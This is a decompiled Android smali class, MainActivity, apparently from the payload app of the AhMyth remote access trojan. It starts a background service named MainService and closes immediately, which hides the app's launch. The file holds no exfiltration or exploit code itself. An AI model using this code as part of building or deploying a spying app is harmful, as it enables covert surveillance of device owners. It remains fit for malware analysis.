.class public Lahmyth/mine/king/ahmyth/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 20
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 21
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->setContentView(I)V

    .line 22
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 23
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->finish()V

    .line 24
    return-void
.end method
